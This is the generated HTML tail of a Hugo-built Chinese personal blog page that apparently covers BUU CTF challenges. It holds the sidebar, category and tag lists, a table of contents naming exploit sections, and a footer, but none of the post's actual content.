+      <i class="fas fa-fw fa-chevron-down post-prev-icon me-1" data-fa-transform="rotate-90"></i>
+      <a href="/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-2/2-2-2/ai-wp/">ai wp</a>
+    </div></div>
+</div></article><div class="post-copyright mb-3 row card component" id="post-copyright">
+    <div class="card-header">
+        <h2 class="card-title fs-4 my-2 text-surface">版权</h2>
+    </div>
+    <div class="card-body">
+
+    </div>
+</div><div class="card component row post-comments" id="post-comments">
+  <div class="card-header">
+    <h2 class="card-title my-2 fs-4 text-surface">评论</h2>
+  </div>
+  <div class="card-body">
+
+
+
+</div>
+</div></div>
+</div>
+<aside class="col-xxl-4 sidebar d-flex">
+  <div class="container d-flex flex-column">
+    
+    
+<div class="accordion profile">
+  <div class="accordion-item card row text-center component">
+    <div class="accordion-header card-header border-0" id="profile-header">
+      <a
+        class="accordion-button d-lg-none mb-2 shadow-none p-0 bg-transparent text-surface"
+        role="button" data-bs-toggle="collapse" href="#profile" aria-expanded="true" aria-controls="profile">
+        Profile
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id="profile" aria-labelledby="profile-header">
+      <div class="col-12 d-flex align-items-center justify-content-center"><img
+  class="profile-avatar rounded-circle"
+  alt="微风的龙"
+  src="/images/profile.png"
+  loading="lazy"
+  data-viewer-invisible
+></div>
+      <div class="col-12 profile-meta"><div class="profile-name fw-fold fs-lg">微风的龙</div>
+<div class="profile-bio">哈基龙的博客，随便看看</div><div class="profile-location"><i class="fas fa-fw fa-map-marker-alt"></i>China</div><a class="profile-about" target="_blank" rel="noopener noreferrer" href="https://github.com/weifengdel0ng"><i class="fas fa-fw fa-user"></i>关于我</a></div>
+
+
+<nav class="social-links nav justify-content-center mt-1 justify-content-around">
+      <a class="nav-link social-link" target="_blank" href="https://github.com/weifengdel0ng" title="GitHub" rel="me">
+        <i class="fa-fw fa-2x fab fa-github"
+          ></i>
+      </a>
+  <a class="nav-link social-link" target="_blank" data-rss-feed href="https://weifengdel0ng.github.io/buu/%E7%AC%AC%E4%B8%80%E9%A1%B5/harekazectf2019baby_rop2/%E9%99%84%E4%BB%B6/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  </div>
+</div>
+
+
+<div class="accordion taxonomies-toggle">
+    <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+            <a
+                class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+                role="button" data-bs-toggle="collapse" href="#taxonomies-toggle" aria-expanded="true" aria-controls="taxonomies-toggle">
+                Taxonomies
+            </a>
+        </div>
+        <div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id="taxonomies-toggle">
+            <ul class="nav nav-pills nav-fill" role="tablist">
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link active" id="taxonomyCategoriesTab" data-bs-toggle="tab" data-bs-target="#taxonomyCategories" 
+                            type="button" role="tab" aria-controls="taxonomyCategories" aria-selected="true">
+                            分类
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="taxonomyTagsTab" data-bs-toggle="tab" data-bs-target="#taxonomyTags" 
+                            type="button" role="tab" aria-controls="taxonomyTags" aria-selected="true">
+                            标签
+                        </button>
+                    </li>
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="taxonomyArchivesTab" data-bs-toggle="tab" data-bs-target="#taxonomyArchives" 
+                        type="button" role="tab" aria-controls="taxonomyArchives" aria-selected="true">
+                        归档
+                    </button>
+                </li>
+            </ul>
+            
+            <div class="tab-content mt-3">
+                    <div class="tab-pane active" id="taxonomyCategories" role="tabpanel" aria-labelledby="taxonomyCategoriesTab" tabindex="0">
+                        <a href="/categories/buu/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="BUU">
+                            BUU
+                        </a>
+                        <a href="/categories/%E4%B8%93%E9%A2%98/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="专题">
+                            专题
+                        </a>
+                        <a href="/categories/%E5%BB%BA%E7%AB%99/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="建站">
+                            建站
+                        </a>
+                    </div>
+                    <div class="tab-pane" id="taxonomyTags" role="tabpanel" aria-labelledby="taxonomyTagsTab" tabindex="0">
+                        <a href="/tags/buu/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="BUU">
+                            BUU
+                        </a>
+                        <a href="/tags/blog/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Blog">
+                            Blog
+                        </a>
+                        <a href="/tags/github-pages/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="GitHub Pages">
+                            GitHub Pages
+                        </a>
+                        <a href="/tags/hugo/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Hugo">
+                            Hugo
+                        </a>
+                    </div>
+                <div class="tab-pane" id="taxonomyArchives" role="tabpanel" aria-labelledby="taxonomyArchivesTab" tabindex="0">
+
+    <a href="" class="btn btn-sm btn-secondary post-taxonomy ps-3 me-2 mb-2" title="2026">
+    2026 <span class="badge badge-sm text-secondary bg-white ms-1">2</span>
+    </a>
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+    <div class="accordion posts-toggle">
+      <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+          <a
+            class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+            role="button"
+            data-bs-toggle="collapse"
+            href="#posts-toggle"
+            aria-expanded="true"
+            aria-controls="posts-toggle">
+            文章
+          </a>
+        </div>
+        <div
+          class="card-body collapse accordion-collapse accordion-body d-lg-block show"
+          id="posts-toggle">
+          <ul class="nav nav-pills nav-fill" role="tablist">
+              <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link active"
+                  id="recent-posts-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#recent-posts"
+                  type="button"
+                  role="tab"
+                  aria-controls="recent-posts"
+                  aria-selected="true">
+                  最近文章
+                </button>
+              </li>
+          </ul>
+
+          <div class="tab-content mt-3">
+              <div
+                class="tab-pane active"
+                id="recent-posts"
+                role="tabpanel"
+                aria-labelledby="recent-posts-tab"
+                tabindex="0">
+                <ul class="post-list list-unstyled ms-1">
+                    <li class="mb-2">
+  <div class="d-flex">
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
+      <a class="post-title" href="/posts/hello-hugo/">
+        博客已上线
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          April 27, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+  <div class="d-flex">
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
+      <a class="post-title" href="/posts/buu/">
+        BUU
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          April 27, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                </ul>
+              </div>
+          </div>
+        </div>
+      </div>
+    </div>
+<div class="accordion post-toc d-none d-lg-block">
+  <div class="accordion-item row mb-4 card component" id="postTOC">
+    <div class="card-header accordion-header">
+      <h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">目录</h2>
+      <a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role="button" data-bs-toggle="collapse" href="#post-toc" aria-expanded="false" aria-controls="post-toc">
+        目录
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block" id="post-toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+        <li><a href="#利用">利用：</a></li>
+        <li><a href="#利用思路">利用思路：</a></li>
+        <li><a href="#exp1">exp1：</a></li>
+        <li><a href="#exp2">exp2:</a></li>
+        <li><a href="#堆简单的利用">堆简单的利用：</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+  </div>
+</aside>
+
+      </div>
+    </main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex="-1" id="offcanvasActionsPanel"
+  aria-labelledby="offcanvasActionsPanelLabel">
+  <div class="offcanvas-header">
+    <div class="offcanvas-title h5" id="offcanvasActionsPanelLabel">
+      <i class="fas fa-fw fa-th-large me-1"></i>
+      操作
+    </div>
+    <button type="button" class="btn-close ms-auto" data-bs-dismiss="offcanvas" data-bs-target="offcanvasActionsPanel" aria-label="Close"></button>
+  </div>
+  <div class="offcanvas-body mt-2"><div class="actions d-flex overflow-auto align-items-center">
+      <a role="button" class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i></span> 返回
+      </a>
+      <a role="button" class="action action-reload-page d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> 刷新
+      </a>
+      <a role="button" class="action action-copy-url d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> 复制链接
+      </a>
+    </div>
+  </div>
+</div><div class="row text-center">
+  <div class="col-12 mt-2">
+    <p class="mb-2">微风的龙</p>
+    <p class="text-secondary mb-2"><small>微风的龙的个人博客，记录技术、项目和思考。</small></p><div class="copyright mb-2 text-secondary">
+  <small>
+</small>
+</div>
+<div class="powered-by mb-2 text-secondary">
+  <small>
+    Build with ❤️ from the <a class="text-primary" href="https://gohugo.io" target="_blank" rel="noopener noreferrer">Hugo</a> and the <a class="text-primary" href="https://github.com/razonyang/hugo-theme-bootstrap" target="_blank" rel="noopener noreferrer">HBS</a> theme.
+  </small>
+</div>
+
+
+<nav class="social-links nav justify-content-center mb-2 mt-3">
+  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="https://weifengdel0ng.github.io/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
+</div>
+</footer>
+<script data-precache src="/assets/main/bundle.min.3de74a0b978ed64b15f6e0d25d913177adc77cae61692b679df48c3036ac2c49.js" integrity="sha256-PedKC5eO1ksV9uDSXZExd63HfK5haStnnfSMMDasLEk=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.2afb6643b7cdde837754668abae3dceedc993b71ebefe8bc9c80af3e2e349075.js" integrity="sha256-KvtmQ7fN3oN3VGaKuuPc7tyZO3Hr7&#43;i8nICvPi40kHU=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/viewer/bundle.min.13800f940d1d83422ff174b45ece49c4c58a17a608fe79bdba39aec874d4c7fe.js" integrity="sha256-E4APlA0dg0Iv8XS0Xs5JxMWKF6YI/nm9ujmuyHTUx/4=" crossorigin="anonymous" defer></script>
+
+
+  </body>
+</html>
